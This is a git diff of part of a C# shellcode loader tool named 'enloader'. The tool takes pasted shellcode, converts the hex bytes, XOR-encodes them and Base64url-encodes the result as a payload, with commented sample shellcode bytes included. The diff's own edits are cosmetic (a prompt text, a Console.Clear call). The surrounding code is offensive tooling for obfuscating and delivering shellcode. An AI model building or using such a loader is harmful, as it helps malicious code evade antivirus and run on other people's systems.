@@ -24,7 +24,7 @@ namespace enloader
             //0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
             //0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 };
 
-            Console.WriteLine("Input csharp shellcode (Ctrl + Enter to quit): ");
+            Console.WriteLine("Input csharp shellcode (Ctrl + Enter): ");
             string sb = string.Empty;
             int lineNum = 1;
 
@@ -52,6 +52,7 @@ namespace enloader
                 foreach (Match match in Regex.Matches(item, pattern))
                     shellcodeStr += match.Value + ',';
             }
+            Console.Clear();
             Console.WriteLine("Your shellcode is:");
             Console.WriteLine(shellcodeStr + "\n");
 
@@ -63,6 +64,7 @@ namespace enloader
             {
                 shellcode[i] = (byte)Convert.ToInt32(shellcodeArr[i], 16);
             }
+
 
             // 解决url编码问题
             string payload = Convert.ToBase64String(xor(shellcode)).TrimEnd('=').Replace('+', '-').Replace('/', '_');
